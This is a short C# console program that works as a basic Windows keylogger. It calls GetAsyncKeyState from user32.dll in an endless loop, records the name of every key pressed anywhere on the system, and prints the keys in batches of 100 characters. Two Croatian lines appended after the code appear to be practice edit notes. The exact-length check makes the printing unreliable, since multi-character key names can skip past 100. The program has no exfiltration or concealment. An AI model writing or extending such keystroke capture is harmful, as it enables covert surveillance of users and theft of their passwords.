using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace ProjektiKonzola
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
           
           
                Start();
            
            
        }
        static void Start()
        {
            string log="";
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        log +=(Keys)i;                       
                        break;
                    }
                }
                if (log.Length == 100)
                {
                    Console.WriteLine("{0,10 }",log);
                    log = "";
                }
            }



        }
    }
}
Dodajem nešto novo
Mijenjam orginal
